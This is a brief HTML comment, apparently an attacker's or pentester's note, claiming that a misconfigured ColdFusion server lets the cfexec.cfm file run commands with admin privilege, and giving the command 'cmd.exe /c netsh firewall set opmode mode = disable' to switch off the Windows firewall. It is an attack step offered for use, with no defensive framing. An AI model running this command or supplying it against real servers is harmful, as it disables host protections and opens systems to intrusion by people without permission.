...
<!-- when cold fusion is misconfigured, the cfexec.cfm file can be executed under admin privilege. When execute commands, 
run the command: "c:\Windows\System32\cmd.exe"
option: /c netsh firewall set opmode mode = disable -->
